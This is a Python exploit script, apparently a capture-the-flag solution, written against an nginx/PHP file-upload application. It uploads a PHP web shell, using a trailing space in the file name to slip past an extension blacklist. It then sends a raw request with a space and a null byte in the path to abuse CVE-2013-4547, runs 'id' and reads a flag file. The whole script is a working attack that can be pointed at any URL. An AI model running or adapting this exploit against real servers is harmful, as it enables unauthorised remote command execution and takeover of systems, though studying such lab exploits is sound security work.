#!/usr/bin/env python3
import requests
import sys
import random
import string
import urllib.parse
import socket
import ssl
from urllib.parse import urlparse

def random_str(n=6):
    return ''.join(random.choices(string.ascii_lowercase, k=n))

def http_raw_request(host, port, path, use_ssl=False, params=None):
    path_bytes = path.encode()
    if params:
        path_bytes += b'?' + urllib.parse.urlencode(params).encode()
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if use_ssl:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(sock, server_hostname=host)
    sock.settimeout(10)
    sock.connect((host, port))
    host_header = f'{host}:{port}' if port != 80 else host
    req = (
        b"GET " + path_bytes + b" HTTP/1.1\r\n"
        b"Host: " + host_header.encode() + b"\r\n"
        b"Connection: close\r\n"
        b"\r\n"
    )
    sock.sendall(req)
    resp = b''
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            resp += chunk
    except socket.timeout:
        pass
    sock.close()
    if b'\r\n\r\n' in resp:
        _, body = resp.split(b'\r\n\r\n', 1)
    else:
        body = resp
    # Strip chunked encoding size lines
    lines = body.split(b'\r\n')
    clean = []
    for line in lines:
        try:
            int(line.strip(), 16)
            continue
        except ValueError:
            pass
        if line:
            clean.append(line)
    return b''.join(clean).decode('utf-8', errors='replace')

def exploit(target):
    target = target.rstrip('/')
    parsed = urlparse(target)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    use_ssl = parsed.scheme == 'https'

    shell_name = random_str() + '.php'
    # Trailing space bypasses PHP's extension blacklist (pathinfo returns 'php ')
    filename = shell_name + ' '
    payload = b'<?php system($_GET["c"]); ?>'

    print(f'[*] Uploading webshell as: {filename!r}')
    try:
        r = requests.post(f'{target}/index.php', files={
            'file_upload': (filename, payload, 'application/octet-stream')
        }, verify=False, timeout=10)
        print(f'[*] Upload response: {r.text.strip()}')
    except Exception as e:
        print(f'[!] Upload failed: {e}')
        sys.exit(1)

    # CVE-2013-4547: nginx 1.4.2 misparses URI with literal space (0x20)
    # and null byte (0x00). The raw HTTP request sends:
    #   GET /uploadfiles/SHELL.php \x00.php?c=id HTTP/1.1
    # nginx matches location ~ \.php$ on the full path, but incorrectly
    # sets SCRIPT_FILENAME to the part before the null byte.
    exploit_path = f'/uploadfiles/{shell_name} \x00.php'
    print(f'[*] Sending exploit: GET /uploadfiles/{shell_name} [0x20][0x00].php')

    output = http_raw_request(host, port, exploit_path, use_ssl, params={'c': 'id'})
    print(f'[*] Output: {output.strip()}')

    if 'uid=' in output:
        flag = http_raw_request(host, port, exploit_path, use_ssl, params={'c': 'cat /flag'})
        print(f'[+] Flag: {flag.strip()}')
    else:
        print('[!] Exploit failed')

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f'Usage: {sys.argv[0]} <url>')
        sys.exit(1)
    exploit(sys.argv[1])
